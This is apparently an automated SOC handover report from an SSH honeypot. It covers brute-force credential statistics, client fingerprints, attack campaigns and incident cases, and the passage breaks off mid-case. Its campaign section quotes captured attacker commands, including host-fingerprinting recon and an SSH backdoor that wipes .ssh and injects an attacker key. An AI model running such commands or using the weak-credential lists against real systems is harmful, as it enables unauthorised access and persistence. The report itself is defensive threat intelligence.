# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-16 |
| **Generated At** | 2026-08-16T03:04:14Z |
| **Shift Time** | 03:04 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **5228** |
| Confirmed Threats | **5206** |
| False Positives Filtered | **22** (0.4%) |
| Unique Attacker IPs | **91** |
| Countries of Origin | **29** |
| High Severity Cases | **192** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **5036** |
| Malware Samples Analyzed | **2** HIGH · **23** MED · 20 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **223** |
| Unique Credential Pairs | **174** |
| Unique Usernames | **37** |
| Unique Passwords | **55** |
| Successful Auth Pairs | **206** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 19 |
| `admin` | 14 |
| `support` | 12 |
| `administrator` | 9 |
| `ftpuser` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `1234` | 18 |
| `admin123` | 14 |
| `123` | 13 |
| `qwerty123` | 13 |
| `1q2w3e4r` | 13 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `Root` | `123123` | 6 |
| `debian` | `P@ssword` | 6 |
| `support` | `password321` | 6 |
| `root` | `123qweasd` | 5 |
| `3comcso` | `RIP000` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin` | `password` | `171.231.185.127` | 2026-08-16T00:55:17 |
| `pi` | `admin123` | `193.32.162.15` | 2026-08-16T00:55:24 |
| `root` | `123qweasd` | `10.0.0.73` | 2026-08-16T00:55:57 |
| `pi` | `1234` | `193.32.162.15` | 2026-08-16T00:56:42 |
| `admin` | `1234` | `171.231.185.127` | 2026-08-16T00:57:58 |
| `pi` | `123` | `193.32.162.15` | 2026-08-16T00:58:02 |
| `root` | `111111` | `217.165.22.192` | 2026-08-16T00:58:15 |
| `root` | `12345678aA` | `45.142.193.164` | 2026-08-16T00:58:34 |
| `pi` | `qwerty123` | `193.32.162.15` | 2026-08-16T00:59:16 |
| `admin` | `admin01` | `171.231.187.71` | 2026-08-16T01:00:19 |
| `pi` | `1q2w3e4r` | `193.32.162.15` | 2026-08-16T01:00:31 |
| `pi` | `pass123` | `193.32.162.15` | 2026-08-16T01:01:45 |
| `admin` | `123456` | `171.231.185.127` | 2026-08-16T01:02:30 |
| `ubuntu` | `0000000` | `185.74.59.14` | 2026-08-16T01:02:31 |
| `pi` | `123abc` | `193.32.162.15` | 2026-08-16T01:02:58 |
| `admin` | `admin123` | `171.231.185.127` | 2026-08-16T01:03:18 |
| `administrator` | `1234567890` | `193.32.162.15` | 2026-08-16T01:04:13 |
| `support` | `support` | `10.0.0.73` | 2026-08-16T01:04:34 |
| `administrator` | `password1` | `193.32.162.15` | 2026-08-16T01:05:26 |
| `config` | `Password` | `183.167.217.86` | 2026-08-16T01:06:11 |
| `administrator` | `admin123` | `193.32.162.15` | 2026-08-16T01:06:38 |
| `3comcso` | `RIP000` | `10.0.0.73` | 2026-08-16T01:06:43 |
| `user` | `1234` | `171.231.187.71` | 2026-08-16T01:07:29 |
| `administrator` | `1234` | `193.32.162.15` | 2026-08-16T01:07:53 |
| `3comcso` | `RIP000` | `115.245.122.146` | 2026-08-16T01:08:06 |
| `3comcso` | `RIP000` | `14.33.95.62` | 2026-08-16T01:08:15 |
| `administrator` | `123` | `193.32.162.15` | 2026-08-16T01:09:06 |
| `administrator` | `qwerty123` | `193.32.162.15` | 2026-08-16T01:10:24 |
| `admin` | `default` | `171.231.185.127` | 2026-08-16T01:10:34 |
| `Root` | `123123` | `75.80.65.214` | 2026-08-16T01:11:21 |
| `Root` | `123123` | `117.158.160.42` | 2026-08-16T01:11:34 |
| `administrator` | `1q2w3e4r` | `193.32.162.15` | 2026-08-16T01:11:40 |
| `operator` | `operator` | `171.231.185.127` | 2026-08-16T01:12:14 |
| `administrator` | `pass123` | `193.32.162.15` | 2026-08-16T01:12:56 |
| `ftp` | `ftp` | `171.231.187.71` | 2026-08-16T01:13:07 |
| `root` | `123qweasd` | `65.20.146.109` | 2026-08-16T01:14:03 |
| `administrator` | `123abc` | `193.32.162.15` | 2026-08-16T01:14:06 |
| `root` | `123qweasd` | `179.181.133.153` | 2026-08-16T01:14:11 |
| `root` | `123qweasd` | `41.42.2.26` | 2026-08-16T01:14:13 |
| `ubuntu` | `00000000` | `185.74.59.14` | 2026-08-16T01:14:31 |
| `ftpuser` | `1234567890` | `193.32.162.15` | 2026-08-16T01:15:19 |
| `ftpuser` | `password1` | `193.32.162.15` | 2026-08-16T01:16:28 |
| `root` | `abcd@1234` | `217.165.22.192` | 2026-08-16T01:17:22 |
| `ftpuser` | `admin123` | `193.32.162.15` | 2026-08-16T01:17:34 |
| `ftpuser` | `1234` | `193.32.162.15` | 2026-08-16T01:18:41 |
| `ftpuser` | `123` | `193.32.162.15` | 2026-08-16T01:19:46 |
| `root` | `Pa$$word01` | `157.245.34.56` | 2026-08-16T01:20:12 |
| `345gs5662d34` | `345gs5662d34` | `157.245.34.56` | 2026-08-16T01:20:14 |
| `root` | `3245gs5662d34` | `157.245.34.56` | 2026-08-16T01:20:14 |
| `root` | `1qaz2wsx.` | `45.142.193.164` | 2026-08-16T01:20:44 |
| `ftpuser` | `qwerty123` | `193.32.162.15` | 2026-08-16T01:20:52 |
| `ftpuser` | `1q2w3e4r` | `193.32.162.15` | 2026-08-16T01:22:01 |
| `Root` | `123123` | `10.0.0.73` | 2026-08-16T01:22:45 |
| `ftpuser` | `pass123` | `193.32.162.15` | 2026-08-16T01:23:00 |
| `root` | `123@@@` | `168.110.102.254` | 2026-08-16T01:23:38 |
| `root` | `LeitboGi0ro` | `168.110.102.254` | 2026-08-16T01:23:38 |
| `3comcso` | `RIP000` | `190.57.233.133` | 2026-08-16T01:24:02 |
| `ftpuser` | `123abc` | `193.32.162.15` | 2026-08-16T01:24:09 |
| `mysql` | `1234567890` | `193.32.162.15` | 2026-08-16T01:25:18 |
| `mysql` | `password1` | `193.32.162.15` | 2026-08-16T01:26:28 |
| `mysql` | `admin123` | `193.32.162.15` | 2026-08-16T01:27:33 |
| `mysql` | `1234` | `193.32.162.15` | 2026-08-16T01:28:43 |
| `nobody` | `1234` | `10.0.0.73` | 2026-08-16T01:29:10 |
| `mysql` | `123` | `193.32.162.15` | 2026-08-16T01:29:48 |
| `test` | `654321` | `39.183.162.243` | 2026-08-16T01:29:49 |
| `test` | `654321` | `220.189.209.18` | 2026-08-16T01:30:01 |
| `mysql` | `qwerty123` | `193.32.162.15` | 2026-08-16T01:30:52 |
| `mysql` | `1q2w3e4r` | `193.32.162.15` | 2026-08-16T01:31:53 |
| `mysql` | `pass123` | `193.32.162.15` | 2026-08-16T01:32:54 |
| `mysql` | `123abc` | `193.32.162.15` | 2026-08-16T01:33:57 |
| `backup` | `1234567890` | `193.32.162.15` | 2026-08-16T01:35:01 |
| `backup` | `password1` | `193.32.162.15` | 2026-08-16T01:36:08 |
| `root` | `admin` | `217.165.22.192` | 2026-08-16T01:36:30 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-16T01:36:40 |
| `backup` | `admin123` | `193.32.162.15` | 2026-08-16T01:37:09 |
| `backup` | `1234` | `193.32.162.15` | 2026-08-16T01:38:15 |
| `backup` | `123` | `193.32.162.15` | 2026-08-16T01:39:21 |
| `Root` | `123123` | `112.25.140.211` | 2026-08-16T01:39:32 |
| `Root` | `123123` | `116.7.248.50` | 2026-08-16T01:39:42 |
| `backup` | `qwerty123` | `193.32.162.15` | 2026-08-16T01:40:25 |
| `backup` | `1q2w3e4r` | `193.32.162.15` | 2026-08-16T01:41:32 |
| `backup` | `pass123` | `193.32.162.15` | 2026-08-16T01:42:39 |
| `root` | `roz@#2536` | `45.142.193.164` | 2026-08-16T01:42:55 |
| `backup` | `123abc` | `193.32.162.15` | 2026-08-16T01:43:50 |
| `www-data` | `1234567890` | `193.32.162.15` | 2026-08-16T01:44:58 |
| `www-data` | `password1` | `193.32.162.15` | 2026-08-16T01:45:55 |
| `www-data` | `admin123` | `193.32.162.15` | 2026-08-16T01:46:55 |
| `nobody` | `1234` | `220.178.246.43` | 2026-08-16T01:47:05 |
| `admin` | `admin666` | `10.0.0.73` | 2026-08-16T01:47:15 |
| `www-data` | `1234` | `193.32.162.15` | 2026-08-16T01:47:54 |
| `www-data` | `123` | `193.32.162.15` | 2026-08-16T01:48:55 |
| `www-data` | `qwerty123` | `193.32.162.15` | 2026-08-16T01:49:56 |
| `www-data` | `1q2w3e4r` | `193.32.162.15` | 2026-08-16T01:50:56 |
| `www-data` | `pass123` | `193.32.162.15` | 2026-08-16T01:51:56 |
| `www-data` | `123abc` | `193.32.162.15` | 2026-08-16T01:53:00 |
| `webmaster` | `1234567890` | `193.32.162.15` | 2026-08-16T01:54:01 |
| `webmaster` | `password1` | `193.32.162.15` | 2026-08-16T01:54:59 |
| `oracle` | `oracle123` | `217.165.22.192` | 2026-08-16T01:55:38 |
| `ubnt` | `p@ssw0rd` | `10.0.0.73` | 2026-08-16T01:55:54 |
| `webmaster` | `admin123` | `193.32.162.15` | 2026-08-16T01:55:58 |
| `webmaster` | `1234` | `193.32.162.15` | 2026-08-16T01:56:57 |
| `centos` | `987654321` | `196.188.93.169` | 2026-08-16T01:57:25 |
| `centos` | `987654321` | `178.178.194.131` | 2026-08-16T01:57:35 |
| `webmaster` | `123` | `193.32.162.15` | 2026-08-16T01:57:58 |
| `webmaster` | `qwerty123` | `193.32.162.15` | 2026-08-16T01:58:58 |
| `default` | `alpine` | `10.0.0.73` | 2026-08-16T01:59:40 |
| `webmaster` | `1q2w3e4r` | `193.32.162.15` | 2026-08-16T01:59:54 |
| `guest` | `p@ssw0rd` | `106.89.59.63` | 2026-08-16T02:00:21 |
| `guest` | `p@ssw0rd` | `175.100.107.238` | 2026-08-16T02:00:33 |
| `webmaster` | `pass123` | `193.32.162.15` | 2026-08-16T02:00:51 |
| `webmaster` | `123abc` | `193.32.162.15` | 2026-08-16T02:01:52 |
| `ubuntu` | `smart@123` | `185.74.59.14` | 2026-08-16T02:02:38 |
| `nagios` | `1234567890` | `193.32.162.15` | 2026-08-16T02:02:48 |
| `nagios` | `password1` | `193.32.162.15` | 2026-08-16T02:03:42 |
| `nagios` | `admin123` | `193.32.162.15` | 2026-08-16T02:04:40 |
| `root` | `Asd123456` | `45.142.193.164` | 2026-08-16T02:05:19 |
| `nagios` | `1234` | `193.32.162.15` | 2026-08-16T02:05:36 |
| `nagios` | `123` | `193.32.162.15` | 2026-08-16T02:06:33 |
| `nagios` | `qwerty123` | `193.32.162.15` | 2026-08-16T02:07:30 |
| `support` | `support` | `176.53.159.196` | 2026-08-16T02:07:39 |
| `nagios` | `1q2w3e4r` | `193.32.162.15` | 2026-08-16T02:08:27 |
| `nagios` | `pass123` | `193.32.162.15` | 2026-08-16T02:09:26 |
| `nagios` | `123abc` | `193.32.162.15` | 2026-08-16T02:10:26 |
| `tomcat` | `1234567890` | `193.32.162.15` | 2026-08-16T02:11:18 |
| `tomcat` | `password1` | `193.32.162.15` | 2026-08-16T02:12:21 |
| `ubnt` | `p@ssw0rd` | `117.211.15.106` | 2026-08-16T02:12:59 |
| `ubnt` | `p@ssw0rd` | `94.205.250.78` | 2026-08-16T02:13:09 |
| `debian` | `P@ssword` | `10.0.0.73` | 2026-08-16T02:13:15 |
| `tomcat` | `admin123` | `193.32.162.15` | 2026-08-16T02:13:17 |
| `tomcat` | `1234` | `193.32.162.15` | 2026-08-16T02:14:14 |
| `ubuntu` | `Dell@1234` | `185.74.59.14` | 2026-08-16T02:14:38 |
| `dmdba` | `dmdba` | `217.165.22.192` | 2026-08-16T02:14:45 |
| `debian` | `P@ssword` | `120.198.138.185` | 2026-08-16T02:14:51 |
| `debian` | `P@ssword` | `218.29.231.106` | 2026-08-16T02:15:00 |
| `tomcat` | `123` | `193.32.162.15` | 2026-08-16T02:15:10 |
| `tomcat` | `qwerty123` | `193.32.162.15` | 2026-08-16T02:16:05 |
| `tomcat` | `1q2w3e4r` | `193.32.162.15` | 2026-08-16T02:17:01 |
| `tomcat` | `pass123` | `193.32.162.15` | 2026-08-16T02:17:59 |
| `default` | `66666` | `179.185.1.97` | 2026-08-16T02:18:02 |
| `default` | `66666` | `122.176.21.104` | 2026-08-16T02:18:15 |
| `tomcat` | `123abc` | `193.32.162.15` | 2026-08-16T02:18:55 |
| `weblogic` | `1234567890` | `193.32.162.15` | 2026-08-16T02:19:50 |
| `weblogic` | `password1` | `193.32.162.15` | 2026-08-16T02:20:47 |
| `centos` | `123123` | `92.255.196.185` | 2026-08-16T02:20:49 |
| `weblogic` | `admin123` | `193.32.162.15` | 2026-08-16T02:21:42 |
| `weblogic` | `1234` | `193.32.162.15` | 2026-08-16T02:22:37 |
| `weblogic` | `123` | `193.32.162.15` | 2026-08-16T02:23:33 |
| `weblogic` | `qwerty123` | `193.32.162.15` | 2026-08-16T02:24:30 |
| `weblogic` | `1q2w3e4r` | `193.32.162.15` | 2026-08-16T02:25:29 |
| `weblogic` | `pass123` | `193.32.162.15` | 2026-08-16T02:26:25 |
| `ubuntu` | `qweQWE123` | `185.74.59.14` | 2026-08-16T02:26:36 |
| `weblogic` | `123abc` | `193.32.162.15` | 2026-08-16T02:27:20 |
| `root` | `QWEqwe123` | `45.142.193.164` | 2026-08-16T02:27:36 |
| `git` | `1234567890` | `193.32.162.15` | 2026-08-16T02:28:17 |
| `git` | `password1` | `193.32.162.15` | 2026-08-16T02:29:12 |
| `default` | `66666` | `10.0.0.73` | 2026-08-16T02:29:24 |
| `git` | `admin123` | `193.32.162.15` | 2026-08-16T02:30:06 |
| `debian` | `P@ssword` | `175.206.113.91` | 2026-08-16T02:30:39 |
| `debian` | `P@ssword` | `88.84.209.146` | 2026-08-16T02:30:53 |
| `git` | `1234` | `193.32.162.15` | 2026-08-16T02:31:01 |
| `devops` | `devops123!` | `20.153.204.5` | 2026-08-16T02:31:26 |
| `345gs5662d34` | `345gs5662d34` | `20.153.204.5` | 2026-08-16T02:31:29 |
| `devops` | `3245gs5662d34` | `20.153.204.5` | 2026-08-16T02:31:30 |
| `git` | `123` | `193.32.162.15` | 2026-08-16T02:31:55 |
| `git` | `qwerty123` | `193.32.162.15` | 2026-08-16T02:32:50 |
| `git` | `1q2w3e4r` | `193.32.162.15` | 2026-08-16T02:33:45 |
| `huawei` | `Huawei12#$` | `217.165.22.192` | 2026-08-16T02:33:53 |
| `git` | `pass123` | `193.32.162.15` | 2026-08-16T02:34:39 |
| `git` | `123abc` | `193.32.162.15` | 2026-08-16T02:35:34 |
| `support` | `password321` | `10.0.0.73` | 2026-08-16T02:36:05 |
| `svn` | `1234567890` | `193.32.162.15` | 2026-08-16T02:36:27 |
| `support` | `admin1` | `10.0.0.73` | 2026-08-16T02:37:09 |
| `svn` | `password1` | `193.32.162.15` | 2026-08-16T02:37:21 |
| `svn` | `admin123` | `193.32.162.15` | 2026-08-16T02:38:18 |
| `ubuntu` | `Aa123123` | `185.74.59.14` | 2026-08-16T02:38:37 |
| `svn` | `1234` | `193.32.162.15` | 2026-08-16T02:39:13 |
| `svn` | `123` | `193.32.162.15` | 2026-08-16T02:40:08 |
| `svn` | `qwerty123` | `193.32.162.15` | 2026-08-16T02:41:06 |
| `svn` | `1q2w3e4r` | `193.32.162.15` | 2026-08-16T02:42:01 |
| `svn` | `pass123` | `193.32.162.15` | 2026-08-16T02:42:56 |
| `admin` | `alpine` | `154.146.238.122` | 2026-08-16T02:43:23 |
| `svn` | `123abc` | `193.32.162.15` | 2026-08-16T02:43:50 |
| `docker` | `1234567890` | `193.32.162.15` | 2026-08-16T02:44:46 |
| `docker` | `password1` | `193.32.162.15` | 2026-08-16T02:45:41 |
| `default` | `66666` | `182.60.128.241` | 2026-08-16T02:46:20 |
| `default` | `66666` | `60.175.91.53` | 2026-08-16T02:46:30 |
| `admin` | `Admin@1234` | `10.0.0.73` | 2026-08-16T02:46:30 |
| `docker` | `admin123` | `193.32.162.15` | 2026-08-16T02:46:35 |
| `centos` | `password321` | `10.0.0.73` | 2026-08-16T02:46:54 |
| `docker` | `1234` | `193.32.162.15` | 2026-08-16T02:47:29 |
| `centos` | `password321` | `122.176.45.238` | 2026-08-16T02:48:17 |
| `centos` | `password321` | `178.178.194.134` | 2026-08-16T02:48:24 |
| `docker` | `123` | `193.32.162.15` | 2026-08-16T02:48:27 |
| `docker` | `qwerty123` | `193.32.162.15` | 2026-08-16T02:49:22 |
| `root` | `Password123!` | `45.142.193.164` | 2026-08-16T02:50:11 |
| `docker` | `1q2w3e4r` | `193.32.162.15` | 2026-08-16T02:50:18 |
| `docker` | `pass123` | `193.32.162.15` | 2026-08-16T02:51:15 |
| `ubnt` | `alpine` | `94.228.240.2` | 2026-08-16T02:51:32 |
| `docker` | `123abc` | `193.32.162.15` | 2026-08-16T02:52:13 |
| `db2inst1` | `db2inst1` | `217.165.22.192` | 2026-08-16T02:53:00 |
| `redis` | `1234567890` | `193.32.162.15` | 2026-08-16T02:53:11 |
| `support` | `password321` | `182.79.218.101` | 2026-08-16T02:54:12 |
| `redis` | `password1` | `193.32.162.15` | 2026-08-16T02:54:14 |
| `support` | `password321` | `120.194.50.39` | 2026-08-16T02:54:21 |
| `support` | `password321` | `61.145.181.7` | 2026-08-16T02:54:24 |
| `support` | `password321` | `96.1.40.151` | 2026-08-16T02:54:31 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **5228** |
| Sessions with Fingerprint | **14** |
| Unique HASSH Fingerprints | **14** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 140 |
| OpenSSH | 39 |
| libssh | 11 |
| AsyncSSH (Python) | 9 |
| Paramiko (Python) | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 117 | 1 |
| `acaa53e0a7d7...` | Mirai/variant | 37 | 37 |
| `98ddc5604ef6...` | Modern SSH client | 12 | 2 |
| `fda360b1b4f4...` | Mirai/variant | 9 | 2 |
| `e45f2d6d7f79...` | Mirai/variant | 7 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 117 | 1 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 37 | 37 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 12 | 2 | Modern SSH client |
| `fda360b1b4f4...` | AsyncSSH (Python) | 9 | 2 | Mirai/variant |
| `e45f2d6d7f79...` | Go SSH scanner | 7 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `95420f9d932d...` | libssh | 5 | 1 | — |
| `6372ee695756...` | Paramiko (Python) | 3 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **5** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 117 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `193.32.162.15`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `157.245.34.56`, `20.153.204.5`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **91** |
| Unique ASNs | **68** |
| High-Risk ASNs | **56** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 6 | HIGH |
| `AS25369` | Hydra Communications Ltd | 4 | HIGH |
| `AS4766` | Korea Telecom | 3 | HIGH |
| `AS18881` | TELEFÔNICA BRASIL S.A | 2 | HIGH |
| `AS7552` | Viettel Group | 2 | HIGH |
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS47890` | UNMANAGED LTD | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (191)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-32211fe7d76d

| Field | Detail |
|---|---|
| **Source IP** | `171.231.185[.]127` |
| **First Seen** | 2026-08-16 00:55 |
| **Last Seen** | 2026-08-16 00:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 00:55:13` | `cowrie.session.connect` |
| `2026-08-16 00:55:13` | `cowrie.client.version` |
| `2026-08-16 00:55:13` | `cowrie.client.kex` |
| `2026-08-16 00:55:17` | `cowrie.login.success` |
| `2026-08-16 00:55:18` | `cowrie.direct-tcpip.request` |
| `2026-08-16 00:55:18` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-16 00:55:18` | `cowrie.direct-tcpip.data` |
| `2026-08-16 00:55:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.185[.]127` to AbuseIPDB if not already reported
- [ ] Block `171.231.185[.]127` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-008b40db65f7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 00:55 |
| **Last Seen** | 2026-08-16 00:55 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 00:55:19` | `cowrie.session.connect` |
| `2026-08-16 00:55:20` | `cowrie.client.version` |
| `2026-08-16 00:55:20` | `cowrie.client.kex` |
| `2026-08-16 00:55:24` | `cowrie.login.success` |
| `2026-08-16 00:55:26` | `cowrie.session.params` |
| `2026-08-16 00:55:26` | `cowrie.command.input` |
| `2026-08-16 00:55:26` | `cowrie.command.input` |
| `2026-08-16 00:55:26` | `cowrie.command.input` |
| `2026-08-16 00:55:26` | `cowrie.command.input` |
| `2026-08-16 00:55:26` | `cowrie.command.input` |
| `2026-08-16 00:55:26` | `cowrie.command.success` |
| `2026-08-16 00:55:26` | `cowrie.command.input` |
| `2026-08-16 00:55:26` | `cowrie.command.input` |
| `2026-08-16 00:55:26` | `cowrie.command.input` |
| `2026-08-16 00:55:26` | `cowrie.command.input` |
| `2026-08-16 00:55:27` | `cowrie.log.closed` |
| `2026-08-16 00:55:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa33c62b982b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 00:56 |
| **Last Seen** | 2026-08-16 00:56 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 00:56:39` | `cowrie.session.connect` |
| `2026-08-16 00:56:39` | `cowrie.client.version` |
| `2026-08-16 00:56:39` | `cowrie.client.kex` |
| `2026-08-16 00:56:42` | `cowrie.login.success` |
| `2026-08-16 00:56:45` | `cowrie.session.params` |
| `2026-08-16 00:56:45` | `cowrie.command.input` |
| `2026-08-16 00:56:45` | `cowrie.command.input` |
| `2026-08-16 00:56:45` | `cowrie.command.input` |
| `2026-08-16 00:56:45` | `cowrie.command.input` |
| `2026-08-16 00:56:45` | `cowrie.command.input` |
| `2026-08-16 00:56:45` | `cowrie.command.success` |
| `2026-08-16 00:56:45` | `cowrie.command.input` |
| `2026-08-16 00:56:45` | `cowrie.command.input` |
| `2026-08-16 00:56:45` | `cowrie.command.input` |
| `2026-08-16 00:56:45` | `cowrie.command.input` |
| `2026-08-16 00:56:46` | `cowrie.log.closed` |
| `2026-08-16 00:56:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d1d6685f578

| Field | Detail |
|---|---|
| **Source IP** | `171.231.185[.]127` |
| **First Seen** | 2026-08-16 00:57 |
| **Last Seen** | 2026-08-16 00:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 00:57:55` | `cowrie.session.connect` |
| `2026-08-16 00:57:55` | `cowrie.client.version` |
| `2026-08-16 00:57:57` | `cowrie.client.kex` |
| `2026-08-16 00:57:58` | `cowrie.login.success` |
| `2026-08-16 00:57:58` | `cowrie.direct-tcpip.request` |
